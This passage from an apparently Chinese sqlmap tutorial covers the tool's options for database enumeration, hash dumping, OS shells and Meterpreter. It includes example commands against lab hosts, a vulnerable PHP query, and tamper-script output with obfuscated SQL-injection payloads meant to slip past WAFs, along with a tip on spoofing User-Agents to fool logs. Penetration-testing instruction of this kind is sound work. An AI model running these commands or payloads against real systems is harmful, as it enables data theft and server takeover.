class="line">    --dbms-cred=DBMS..  DBMS 认证凭据（username:password）</span><br><span class="line">    --os=OS             指定 DBMS 服务器的操作系统类型</span><br><span class="line">    --invalid-bignum    将无效值设置为大数</span><br><span class="line">    --invalid-logical   对无效值使用逻辑运算</span><br><span class="line">    --invalid-string    对无效值使用随机字符串</span><br><span class="line">    --no-cast           关闭 payload 构造机制</span><br><span class="line">    --no-escape         关闭字符串转义机制</span><br><span class="line">    --prefix=PREFIX     注入 payload 的前缀字符串</span><br><span class="line">    --suffix=SUFFIX     注入 payload 的后缀字符串</span><br><span class="line">    --tamper=TAMPER     用给定脚本修改注入数据</span><br><span class="line"></span><br><span class="line">  检测：</span><br><span class="line">    以下选项用于自定义检测方式</span><br><span class="line"></span><br><span class="line">    --level=LEVEL       设置测试等级（1-5，默认为 1）</span><br><span class="line">    --risk=RISK         设置测试风险等级（1-3，默认为 1）</span><br><span class="line">    --string=STRING     用于确定查询结果为真时的字符串</span><br><span class="line">    --not-string=NOT..  用于确定查询结果为假时的字符串</span><br><span class="line">    --regexp=REGEXP     用于确定查询结果为真时的正则表达式</span><br><span class="line">    --code=CODE         用于确定查询结果为真时的 HTTP 状态码</span><br><span class="line">    --text-only         只根据页面文本内容对比页面</span><br><span class="line">    --titles            只根据页面标题对比页面</span><br><span class="line"></span><br><span class="line">  技术：</span><br><span class="line">    以下选项用于调整特定 SQL 注入技术的测试方法</span><br><span class="line"></span><br><span class="line">    --technique=TECH    使用的 SQL 注入技术（默认为“BEUSTQ”，译者注：</span><br><span class="line">                        B: Boolean-based blind SQL injection（布尔型盲注）</span><br><span class="line">                        E: Error-based SQL injection（报错型注入）</span><br><span class="line">                        U: UNION query SQL injection（联合查询注入）</span><br><span class="line">                        S: Stacked queries SQL injection（堆查询注入）</span><br><span class="line">                        T: Time-based blind SQL injection（时间型盲注）</span><br><span class="line">                        Q: inline Query injection（内联查询注入）</span><br><span class="line">    --time-sec=TIMESEC  延迟 DBMS 的响应秒数（默认为 5）</span><br><span class="line">    --union-cols=UCOLS  设置联合查询注入测试的列数目范围</span><br><span class="line">    --union-char=UCHAR  用于暴力猜解列数的字符</span><br><span class="line">    --union-from=UFROM  设置联合查询注入 FROM 处用到的表</span><br><span class="line">    --dns-domain=DNS..  设置用于 DNS 渗出攻击的域名（译者注：</span><br><span class="line">                        推荐阅读《在SQL注入中使用DNS获取数据》</span><br><span class="line">                        http://cb.drops.wiki/drops/tips-5283.html，</span><br><span class="line">                        在后面的“技术”小节中也有相应解释）</span><br><span class="line">    --second-order=S..  设置二阶响应的结果显示页面的 URL（译者注：</span><br><span class="line">                        该选项用于二阶 SQL 注入）</span><br><span class="line"></span><br><span class="line">  指纹识别：</span><br><span class="line">    -f, --fingerprint   执行广泛的 DBMS 版本指纹识别</span><br><span class="line"></span><br><span class="line">  枚举：</span><br><span class="line">      以下选项用于获取后端数据库管理系统的信息，结构和数据表中的数据。</span><br><span class="line">      此外，还���以运行你输入的 SQL 语句</span><br><span class="line"></span><br><span class="line">    -a, --all           获取所有信息、数据</span><br><span class="line">    -b, --banner        获取 DBMS banner</span><br><span class="line">    --current-user      获取 DBMS 当前用户</span><br><span class="line">    --current-db        获取 DBMS 当前数据库</span><br><span class="line">    --hostname          获取 DBMS 服务器的主机名</span><br><span class="line">    --is-dba            探测 DBMS 当前用户是否为 DBA（数据库管理员）</span><br><span class="line">    --users             枚举出 DBMS 所有用户</span><br><span class="line">    --passwords         枚举出 DBMS 所有用户的密码哈希</span><br><span class="line">    --privileges        枚举出 DBMS 所有用户特权级</span><br><span class="line">    --roles             枚举出 DBMS 所有用户角色</span><br><span class="line">    --dbs               枚举出 DBMS 所有数据库</span><br><span class="line">    --tables            枚举出 DBMS 数据库中的所有表</span><br><span class="line">    --columns           枚举出 DBMS 表中的所有列</span><br><span class="line">    --schema            枚举出 DBMS 所有模式</span><br><span class="line">    --count             获取数据表数目</span><br><span class="line">    --dump              导出 DBMS 数据库表项</span><br><span class="line">    --dump-all          导出所有 DBMS 数据库表项</span><br><span class="line">    --search            搜索列，表和/或数据库名</span><br><span class="line">    --comments          获取 DBMS 注释</span><br><span class="line">    -D DB               指定要枚举的 DBMS 数据库</span><br><span class="line">    -T TBL              指定要枚举的 DBMS 数据表</span><br><span class="line">    -C COL              指定要枚举的 DBMS 数据列</span><br><span class="line">    -X EXCLUDECOL       指定要排除的 DBMS 数据列</span><br><span class="line">    -U USER             指定枚举的 DBMS 用户</span><br><span class="line">    --exclude-sysdbs    枚举所有数据表时，指定排除特定系统数据库</span><br><span class="line">    --pivot-column=P..  指定主列</span><br><span class="line">    --where=DUMPWHERE   在转储表时使用 WHERE 条件语句</span><br><span class="line">    --start=LIMITSTART  指定要导出的数据表条目开始行数</span><br><span class="line">    --stop=LIMITSTOP    指定要导出的数据表条目结束行数</span><br><span class="line">    --first=FIRSTCHAR   指定获取返回查询结果的开始字符位</span><br><span class="line">    --last=LASTCHAR     指定获取返回查询结果的结束字符位</span><br><span class="line">    --sql-query=QUERY   指定要执行的 SQL 语句</span><br><span class="line">    --sql-shell         调出交互式 SQL shell</span><br><span class="line">    --sql-file=SQLFILE  执行文件中的 SQL 语句</span><br><span class="line"></span><br><span class="line">  暴��破解：</span><br><span class="line">    以下选项用于暴力破解测试</span><br><span class="line"></span><br><span class="line">    --common-tables     检测常见的表名是否存在</span><br><span class="line">    --common-columns    检测常用的列名是否存在</span><br><span class="line"></span><br><span class="line">  用户自定义函数注入：</span><br><span class="line">    以下选项用于创建用户自定义函数</span><br><span class="line"></span><br><span class="line">    --udf-inject        注入用户自定义函数</span><br><span class="line">    --shared-lib=SHLIB  共享库的本地路径</span><br><span class="line"></span><br><span class="line">  访问文件系统：</span><br><span class="line">    以下选项用于访问后端数据库管理系统的底层文件系统</span><br><span class="line"></span><br><span class="line">    --file-read=RFILE   读取后端 DBMS 文件系统中的文件</span><br><span class="line">    --file-write=WFILE  写入后端 DBMS 文件系统中的文件</span><br><span class="line">    --file-dest=DFILE   使用文件绝对路径写入到后端 DBMS</span><br><span class="line"></span><br><span class="line">  访问操作系统：</span><br><span class="line">    以下选项用于访问后端数据库管理系统的底层操作系统</span><br><span class="line"></span><br><span class="line">    --os-cmd=OSCMD      执行操作系统命令</span><br><span class="line">    --os-shell          调出交互式操作系统 shell</span><br><span class="line">    --os-pwn            调出 OOB shell，Meterpreter 或 VNC</span><br><span class="line">    --os-smbrelay       一键调出 OOB shell，Meterpreter 或 VNC</span><br><span class="line">    --os-bof            利用存储过程的缓冲区溢出</span><br><span class="line">    --priv-esc          数据库进程用户提权</span><br><span class="line">    --msf-path=MSFPATH  Metasploit 框架的本地安装路径</span><br><span class="line">    --tmp-path=TMPPATH  远程临时文件目录的绝对路径</span><br><span class="line"></span><br><span class="line">  访问 Windows 注册表：</span><br><span class="line">    以下选项用于访问后端数据库管理系统的 Windows 注册表</span><br><span class="line"></span><br><span class="line">    --reg-read          读取一个 Windows 注册表键值</span><br><span class="line">    --reg-add           写入一个 Windows 注册表键值数据</span><br><span class="line">    --reg-del           删除一个 Windows 注册表键值</span><br><span class="line">    --reg-key=REGKEY    指定 Windows 注册表键</span><br><span class="line">    --reg-value=REGVAL  指定 Windows 注册表键值</span><br><span class="line">    --reg-data=REGDATA  指定 Windows 注册表键值数据</span><br><span class="line">    --reg-type=REGTYPE  指定 Windows 注册表键值类型</span><br><span class="line"></span><br><span class="line">  通用选项：</span><br><span class="line">    以下选项用于设置通用的参数</span><br><span class="line"></span><br><span class="line">    -s SESSIONFILE      从文件（.sqlite）中读入会话信息</span><br><span class="line">    -t TRAFFICFILE      保存所有 HTTP 流量记录到指定文本文件</span><br><span class="line">    --batch             从不询问用户输入，使用默认配置</span><br><span class="line">    --binary-fields=..  具有二进制值的结果字段（例如："digest"）</span><br><span class="line">    --check-internet    在访问目标之前检查是否正常连接互联网</span><br><span class="line">    --crawl=CRAWLDEPTH  从目标 URL 开始爬取网站</span><br><span class="line">    --crawl-exclude=..  用正则表达式筛选爬取的页面（例如："logout"）</span><br><span class="line">    --csv-del=CSVDEL    指定输出到 CVS 文件时使用的分隔符（默认为“,”）</span><br><span class="line">    --charset=CHARSET   指定 SQL 盲注字符集（例如："0123456789abcdef"）</span><br><span class="line">    --dump-format=DU..  导出数据的格式（CSV（默认），HTML 或 SQLITE）</span><br><span class="line">    --encoding=ENCOD..  指定获取数据时使用的字符编码（例如：GBK）</span><br><span class="line">    --eta               显示每个结果输出的预计到达时间</span><br><span class="line">    --flush-session     清空当前目标的会话文件</span><br><span class="line">    --forms             解析并测试目标 URL 的表单</span><br><span class="line">    --fresh-queries     忽略存储在会话文件中的查询结果</span><br><span class="line">    --har=HARFILE       将所有 HTTP 流量记录到一个 HAR 文件中</span><br><span class="line">    --hex               获取数据时调用 DBMS 的 hex 函数</span><br><span class="line">    --output-dir=OUT..  自定义输出目录路径</span><br><span class="line">    --parse-errors      从响应中解析并显示 DBMS 错误信息</span><br><span class="line">    --save=SAVECONFIG   将选项设置保存到一个 INI 配置文件</span><br><span class="line">    --scope=SCOPE       用正则表达式从提供的代理日志中过滤目标</span><br><span class="line">    --test-filter=TE..  根据 payloads 和/或标题（例如：ROW）选择测试</span><br><span class="line">    --test-skip=TEST..  根据 payloads 和/或标题（例如：BENCHMARK）跳过部分测试</span><br><span class="line">    --update            更新 sqlmap</span><br><span class="line"></span><br><span class="line">  其他选项：</span><br><span class="line">    -z MNEMONICS        使用短助记符（例如：“flu,bat,ban,tec=EU”）</span><br><span class="line">    --alert=ALERT       在找到 SQL 注入时运行 OS 命令</span><br><span class="line">    --answers=ANSWERS   设置问题答案（例如：“quit=N,follow=N”）</span><br><span class="line">    --beep              出现问题提醒或在发现 SQL 注入时发出提示音</span><br><span class="line">    --cleanup           指定移除 DBMS 中的特定的 UDF 或者数据表</span><br><span class="line">    --dependencies      检查 sqlmap 缺少什么（非核心）依赖</span><br><span class="line">    --disable-coloring  关闭彩色控制台输出</span><br><span class="line">    --gpage=GOOGLEPAGE  指定页码使用 Google dork 结果</span><br><span class="line">    --identify-waf      针对 WAF/IPS/IDS 保护进行彻底的测试</span><br><span class="line">    --mobile            使用 HTTP User-Agent 模仿智能手机</span><br><span class="line">    --offline           在离线模式下工作（仅使用会话数据）</span><br><span class="line">    --purge-output      安全地删除输出目录的所有内容</span><br><span class="line">    --skip-waf          跳过启发式检测 WAF/IPS/IDS 保护</span><br><span class="line">    --smart             只有在使用启发式检测时才进行彻底的测试</span><br><span class="line">    --sqlmap-shell      调出交互式 sqlmap shell</span><br><span class="line">    --tmp-dir=TMPDIR    指定用于存储临时文件的本地目录</span><br><span class="line">    --web-root=WEBROOT  指定 Web 服务器根目录（例如："/var/www"）</span><br><span class="line">    --wizard            适合初级用户的向导界面</span><br></pre></td></tr></table></figure><blockquote><p><code>--random-agent</code>      使用随机的 HTTP User-Agent 可以欺骗网站日志记录<br><code>--dbms =MySQL</code>       指定数据库 节省时间<br><code>--technique=</code>       指定报错注入 节省时间</p></blockquote><h1 id="SQLMap中级"><a href="#SQLMap中级" class="headerlink" title="SQLMap中级"></a>SQLMap中级</h1><h2 id="输出详细等级"><a href="#输出详细等级" class="headerlink" title="输出详细等级"></a>输出详细等级</h2><p>选项：<code>-v</code></p><p>该选项用于设置输出信息的详细等级，共有<strong>七个</strong>级别。默认级别为 <strong>1</strong>，输出包括普通信息，警告，错误，关键信息和 Python 出错回遡信息（如果有的话）。</p><ul><li><strong>0</strong>：只输出 Python 出错回溯信息，错误和关键信息。</li><li><strong>1</strong>：增加输出普通信息和警告信息。</li><li><strong>2</strong>：增加输出调试信息。</li><li><strong>3</strong>：增加输出已注入的 payloads。</li><li><strong>4</strong>：增加输出 HTTP 请求。</li><li><strong>5</strong>：增加输出 HTTP 响应头</li><li><strong>6</strong>：增加输出 HTTP 响应内容。</li></ul><p>使用等级 <strong>2</strong> 能更好地了解 sqlmap 内部实现了什么，特别是在检测阶段和使用接管功能时。如果你想知道 sqlmap 发送了什么 SQL payloads，等级 <strong>3</strong> 是最佳选择。需要更深入地检测潜在 Bugs 或应对未知情况时，推荐使用 <strong>4</strong> 或以上等级。</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><h3 id="从给定的文本文件读取多个目标进行扫描"><a href="#从给定的文本文件读取多个目标进行扫描" class="headerlink" title="从给定的文本文件读取多个目标进行扫描"></a>从给定的文本文件读取多个目标进行扫描</h3><p>选项：<code>-m</code></p><p>通过文本文件提供一个目标 URLs 列表，sqlmap 会逐个进行扫描检测。</p><p>样本文件所提供的 URLs 列表示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.target1.com/vuln1.php?q=foobar</span><br><span class="line">www.target2.com/vuln2.asp?id=1</span><br><span class="line">www.target3.com/vuln3/id/1*</span><br></pre></td></tr></table></figure><h3 id="从文件中载入-HTTP-请求"><a href="#从文件中载入-HTTP-请求" class="headerlink" title="从文件中载入 HTTP 请求"></a>从文件中载入 HTTP 请求</h3><p>选项：<code>-r</code></p><p>sqlmap 可以从一个文本中读取原始的 HTTP 请求。通过这种方式，你能够免于设置部分选项（例如：设置 cookies，POST 数据等参数）。</p><p>HTTP 请求文件数据样本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /vuln.php HTTP/1.1</span><br><span class="line">Host: www.target.com</span><br><span class="line">User-Agent: Mozilla/4.0</span><br><span class="line"></span><br><span class="line">id=1</span><br></pre></td></tr></table></figure><p>如果相关的请求是 HTTPS，你可以结合 <code>--force-ssl</code> 开关强制使用 SSL 进行 443/tcp 连接。或者，你可以在 <code>Host</code> 头部信息后面直接加上 <code>:443</code>。</p><h2 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h2><h3 id="HTTP-User-Agent-请求头"><a href="#HTTP-User-Agent-请求头" class="headerlink" title="HTTP User-Agent 请求头"></a>HTTP <code>User-Agent</code> 请求头</h3><p>选项和开关：<code>--user-agent</code> 和 <code>--random-agent</code></p><p>默认情况下，sqlmap 使用以下 <code>User-Agent</code> 请求头值执行 HTTP 请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)</span><br></pre></td></tr></table></figure><p>可以通过提供自定义 User-Agent 作为选项的参数，即选项 <code>--user-agent</code> 来伪造它。</p><p>此外，如果通过提供开关 <code>--random-agent</code>，sqlmap 将从 <code>./txt/user-agents.txt</code> 文本文件中随机选择一个 <code>User-Agent</code>，并将其用于该会话中的所有 HTTP 请求。</p><p>一些站点会对 HTTP <code>User-Agent</code> 请求头值进行服务端检查，如果没有提供有效的 <code>User-Agent</code>，它的值不是常规值或被 Web 应用程序防火墙或类似防御系统列入黑名单，则服务端会拒绝 HTTP 响应。在这种情况下，sqlmap 将显示如下信息：</p><p>注意，如果 <code>--level</code> 设置为 <strong>3</strong> 或以上，sqlmap 会对 HTTP <code>User-Agent</code> 请求头进行 SQL 注入测试。详情请看下文。</p><p>开启<code>apache</code>的日志记录功能</p><p>注意，如果 <code>--level</code> 设置为 <strong>3</strong> 或以上，sqlmap 会对 HTTP <code>User-Agent</code> 请求头进行 SQL 注入测试。详情请看下文。</p><p>打开配置文件-httpd-conf”，打开httpd.conf配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">##CustomLog &quot;logs/access.log&quot; common</span><br></pre></td></tr></table></figure><p>去掉前边的 # ，并<strong>重启apache</strong>。</p><h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>下面的相关选项可用于自定义检测环节。</p><h3 id="级别"><a href="#级别" class="headerlink" title="级别"></a>级别</h3><p>选项：<code>--level</code></p><p>使用这个选项需要给出一个参数用于指定即将进行检测的级别。总共有5个级别。</p><p>默认的级别是 <strong>1</strong>，该级别只会进行简单的检测（请求）。</p><p>与之不同的是，级别 <strong>5</strong> 会更详细地对更大范围 payloads 和 boundaries（作为 SQL payload 的前缀和后缀）进行检测。</p><p>sqlmap 使用的 payloads 直接从文本文件 <code>xml/payloads.xml</code> 中载入。</p><p>根据该文件顶部的相关指导说明进行设置，该文件支持用户自定义编辑添加。</p><p>这个选项设置不止会影响 sqlmap 使用的 payload，还会影响到相关的测试注入点：<strong>总是</strong>测试 GET 和 POST 的相关参数，级别大于等于 <strong>2</strong> 则会测试 HTTP Cookie 头部，级别大于等于 <strong>3</strong> 则会测试 HTTP UserAgent/Referer 头部值。</p><p>总而言之， 如果 SQL 注入检测的难度越高，则需要设定越高的 <code>--level</code> 值。</p><h3 id="风险"><a href="#风险" class="headerlink" title="风险"></a>风险</h3><p>选项：<code>--risk</code></p><p>这个选项需要给出一个参数用于指定即将进行检测的风险程度。总共有3个风险级别。</p><p>默认的级别是 <strong>1</strong>，对大多数 SQL 注入点而言是没有任何风险的。风险级别 <strong>2</strong> 则会在默认的检测上添加大量时间型盲注语句测试，级别 <strong>3</strong> 则会在原基础上添加<code>OR</code>类型的布尔型盲注测试。</p><p>在某些场景下，例如对 <code>UPDATE</code> 语句进行 SQL 注入，注入一个 <code>OR</code> 类型的 payload 会导致目标数据表的所有记录进行更新，显然这个不是攻击者想要的结果。针</p><p>对这个场景及其他相关场景，sqlmap 引入了 <code>--risk</code> 这个选项。通过这个选项：用户可以指定检测特定的 payload，同时用户可任意选择使用可能比较危险的操作。正如上面的选项提及到的，sqlmap 使用的 payloads 是直接在文本文件 <code>xml/payloads.xml</code> 载入的，该文件支持用户自定义编辑添加。</p><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="URI-注入点"><a href="#URI-注入点" class="headerlink" title="URI 注入点"></a>URI 注入点</h3><p>有一些特殊情况是注入点处于 URI 本身内。除非手动指定，sqlmap 不会对 URI 路径执行任何自动测试。你需要在命令行中标明这些注入点，通过在每个需要 sqlmap 测试和利用 SQL 注入的 URI 点后面附加一个星号（<code>*</code>）（注意：也支持 Havij 风格 <code>%INJECT HERE%</code>）。</p><p>例如，当使用了 Apache Web 服务器的 <a href="http://httpd.apache.org/docs/current/mod/mod_rewrite.html" target="_blank" rel="noopener">mod_rewrite</a> 模块或其他类似的技术时，这特别有用。</p><p>一个合法命令行例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://targeturl/param1/value1*/param2/value2/&quot;</span><br></pre></td></tr></table></figure><h3 id="指定-DBMS-类型"><a href="#指定-DBMS-类型" class="headerlink" title="指定 DBMS 类型"></a>指定 DBMS 类型</h3><p>选项：<code>--dbms</code></p><p>默认情况下 sqlmap 会自动检测 Web 应用程序的后端 DBMS。sqlmap 完全支持以下数据库管理系统：</p><ul><li>MySQL</li><li>Oracle</li><li>PostgreSQL</li><li>Microsoft SQL Server</li><li>Microsoft Access</li><li>IBM DB2</li><li>SQLite</li><li>Firebird</li><li>Sybase</li><li>SAP MaxDB</li><li>HSQLDB</li><li>Informix</li></ul><p>注意，此选项<strong>不</strong>是强制性的，强烈建议<strong>仅当你绝对确定</strong>后端 DBMS 时使用它。如果你不知道，就让 sqlmap 自动为你识别指纹信息。</p><h2 id="接管操作系统"><a href="#接管操作系统" class="headerlink" title="接管操作系统"></a>接管操作系统</h2><h3 id="运行任意操作系统命令"><a href="#运行任意操作系统命令" class="headerlink" title="运行任意操作系统命令"></a>运行任意操作系统命令</h3><p>选项和开关：<code>--os-cmd</code> 和 <code>--os-shell</code></p><p>当后端 DBMS 为 MySQL，PostgreSQL 或 Microsoft SQL Server，并且当前会话用户拥有对数据库特定功能和相关架构特性的利用权限时，sqlmap 能够在<strong>数据库所在服务器的操作系统上运行任意的命令</strong>。</p><h1 id="SQLMap高级"><a href="#SQLMap高级" class="headerlink" title="SQLMap高级"></a>SQLMap高级</h1><h2 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h2><h3 id="直连数据库"><a href="#直连数据库" class="headerlink" title="直连数据库"></a>直连数据库</h3><p>选项：<code>-d</code></p><p>针对单一数据库实例运行 sqlmap 工具。这个选项可设置为下面格式的连接字符串：</p><ul><li><code>DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME</code>（MySQL，Oracle，Microsoft SQL Server，PostgreSQL 等。)</li><li><code>DBMS://DATABASE_FILEPATH</code>（SQLite，Microsoft Access，Firebird 等。）</li></ul><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -d <span class="string">"mysql://admin:admin@192.168.21.17:3306/testdb"</span> --dbs --users</span><br></pre></td></tr></table></figure><p>需要 Python 安装对应的依赖：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install SQLAlchemy</span><br><span class="line">pip3 install mysqlclient</span><br></pre></td></tr></table></figure><h2 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h2><p>以下选项可用于调整对特定 SQL 注入技术的测试。</p><h3 id="测试会用到的-SQL-注入技术"><a href="#测试会用到的-SQL-注入技术" class="headerlink" title="测试会用到的 SQL 注入技术"></a>测试会用到的 SQL 注入技术</h3><p>选项：<code>--technique</code></p><p>此选项用于指定需要测试的 SQL 注入类型。默认情况下 sqlmap 会测试它支持的<strong>所有</strong>类型/技术。</p><p>在某些情况下，你可能只想测试一种或几种特定类型的 SQL 注入，这便是该选项存在的作用。</p><p>此选项要一个参数值。该参数是由 <code>B</code>，<code>E</code>，<code>U</code>，<code>S</code>，<code>T</code> 和 <code>Q</code> 这样的字符任意组合成的字符串，每个字母代表不同的技术：</p><ul><li><code>B</code>：布尔型盲注</li><li><code>E</code>：报错型注入</li><li><code>U</code>：联合查询注入</li><li><code>S</code>：堆查询注入</li><li><code>T</code>：时间型盲注</li><li><code>Q</code>：内联查询注入</li></ul><p>例如，如果仅测试利用报错型注入和堆查询注入，你可以提供 <code>ES</code>。默认值为 <code>BEUSTQ</code>。</p><p>注意，当你需要访问文件系统，接管操作系统或访问 Windows 注册表配置单元时，提供的字符串必须包含代表堆查询技术的字母 <code>S</code>。</p><h3 id="设置时间型盲注中-DBMS-延迟响应秒数"><a href="#设置时间型盲注中-DBMS-延迟响应秒数" class="headerlink" title="设置时间型盲注中 DBMS 延迟响应秒数"></a>设置时间型盲注中 DBMS 延迟响应秒数</h3><p>选项：<code>--time-sec</code></p><p>为 <code>--time-sec</code> 提供一个整数，可以设置时间型盲注响应的延迟时间。默认情况下，它的值为 <strong>5 秒</strong>。</p><h2 id="注入-1"><a href="#注入-1" class="headerlink" title="注入"></a>注入</h2><h3 id="自定义注入-payload"><a href="#自定义注入-payload" class="headerlink" title="自定义注入 payload"></a>自定义注入 payload</h3><p>选项：<code>--prefix</code> 和 <code>--suffix</code></p><p>在某些情况下，仅当用户提供附加到注入 payload 的特定后缀时，才能利用易受攻击的参数。另外，当用户已经知道查询语法并希望通过直接提供注入 payload 前缀和后缀来检测利用 SQL 注入时，这些选项对这种场景会很方便。</p><p>漏洞源代码示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM users WHERE id=(&apos;&quot; . $_GET[&apos;id&apos;] . &quot;&apos;) LIMIT 0, 1&quot;;</span><br></pre></td></tr></table></figure><p>要检测并利用此 SQL 注入，您可以让 sqlmap 在检测阶段检测<strong>边界</strong>（与 SQL payload 前缀和后缀组合），或者自己提供。</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php\</span><br><span class="line">?id=1&quot; -p id --prefix &quot;&apos;)&quot; --suffix &quot;AND (&apos;abc&apos;=&apos;abc&quot;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>这将使所有 sqlmap 请求最终构成以下查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM users WHERE id=(&apos;1&apos;) &lt;PAYLOAD&gt; AND (&apos;abc&apos;=&apos;abc&apos;) LIMIT 0, 1&quot;;</span><br></pre></td></tr></table></figure><p>以使查询语法正确。</p><p>在这个简单的例子中，sqlmap 可以检测 SQL 注入并利用它，而不需要提供自定义的边界，但有时在真实情况中的应用程序，当注入点存在于嵌套的 <code>JOIN</code> 查询中时，需要提供它。</p><h3 id="修改注入数据"><a href="#修改注入数据" class="headerlink" title="修改注入数据"></a>修改注入数据</h3><p>选项：<code>--tamper</code></p><p>sqlmap 本身不会混淆发送的 payload，除了将单引号之间的字符串用诸如 <code>CHAR()</code> 进行替换。</p><p>如果后端 DBMS 与用户输入内容存在较弱验证机制的情况下，此选项会非常有用。这种验证机制通常是由应用程序源代码调用自行开发的输入验证例程，如昂贵的企业级 IPS 设备或 Web 应用程序防火墙（WAF）。一言蔽之，它们通常以不同的方式实现并且需要花费大量资金。</p><p>要利用此选项，需要为 sqlmap 提供逗号分隔的修改脚本列表，这将处理 payload 并返回转换结果。你可以定义自己的修改脚本，编辑使用 sqlmap <code>tamper/</code> 文件夹中的脚本，并使用逗号分隔连接它们作为 <code>--tamper</code> 选项的值（例如：<code>--tamper=&quot;between,randomcase&quot;</code>）。</p><p>合法的修改脚本格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># Needed imports</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line"># Define which is the order of application of tamper scripts against</span><br><span class="line"># the payload</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line">def tamper(payload):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    Description of your tamper script</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    # your code to tamper the original payload</span><br><span class="line"></span><br><span class="line">    # return the tampered payload</span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure><p>你可以在 <code>tamper/</code> 目录中查看有效和可用的修改脚本。</p><p>针对 MySQL 目标，假定字符 <code>&gt;</code>、空格和大写的 <code>SELECT</code> 字符串被禁止：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --\</span><br><span class="line">tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3</span><br><span class="line"></span><br><span class="line">[hh:mm:03] [DEBUG] cleaning up configuration parameters</span><br><span class="line">[hh:mm:03] [INFO] loading tamper script &apos;between&apos;</span><br><span class="line">[hh:mm:03] [INFO] loading tamper script &apos;randomcase&apos;</span><br><span class="line">[hh:mm:03] [INFO] loading tamper script &apos;space2comment&apos;</span><br><span class="line">[...]</span><br><span class="line">[hh:mm:04] [INFO] testing &apos;AND boolean-based blind - WHERE or HAVING clause&apos;</span><br><span class="line">[hh:mm:04] [PAYLOAD] 1)/**/And/**/1369=7706/**/And/**/(4092=4092</span><br><span class="line">[hh:mm:04] [PAYLOAD] 1)/**/AND/**/9267=9267/**/AND/**/(4057=4057</span><br><span class="line">[hh:mm:04] [PAYLOAD] 1/**/AnD/**/950=7041</span><br><span class="line">[...]</span><br><span class="line">[hh:mm:04] [INFO] testing &apos;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause</span><br><span class="line">&apos;</span><br><span class="line">[hh:mm:04] [PAYLOAD] 1/**/anD/**/(SELeCt/**/9921/**/fROm(SELeCt/**/counT(*),CONC</span><br><span class="line">AT(cHar(58,117,113,107,58),(SELeCt/**/(case/**/whEN/**/(9921=9921)/**/THeN/**/1/</span><br><span class="line">**/elsE/**/0/**/ENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)*2))x/**/fROm/**/info</span><br><span class="line">rmation_schema.tables/**/group/**/bY/**/x)a)</span><br><span class="line">[hh:mm:04] [INFO] GET parameter &apos;id&apos; is &apos;MySQL &gt;= 5.0 AND error-based - WHERE or</span><br><span class="line"> HAVING clause&apos; injectable</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>sqlmap 1.2.7.20 版本，共有 57 个tamper脚本，与 1.0 版本相比新增了 19 个脚本。</p><table><thead><tr><th 